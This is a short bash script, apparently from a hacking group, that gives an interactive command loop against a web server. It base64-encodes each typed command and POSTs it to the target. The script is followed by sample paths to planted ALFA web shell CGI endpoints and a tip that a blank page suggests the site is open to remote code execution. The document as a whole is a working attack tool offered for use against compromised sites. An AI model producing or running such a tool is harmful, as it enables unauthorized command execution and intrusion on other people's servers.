#!/bin/bash
#Copyright 2024 - NuLz | Haxorstars

echo -n "Target >: "
read target

while true
do
	echo -n "CMD:~# "
	read cmd
	cmd_base64=$(echo -n "$cmd" | base64)
	curl -d "cmd=$cmd_base64" -X POST $target
done

======================================
contoh vuln
http://domain-target/ALFA_DATA/alfacgiapi/perl.alfa
http://domain-target/ALFA_DATA/alfacgiapi/bash.alfa
http://domain-target/ALFA_DATA/alfacgiapi/py.alfa

if the target accessed becomes blank page, maybe the target is vuln to rce
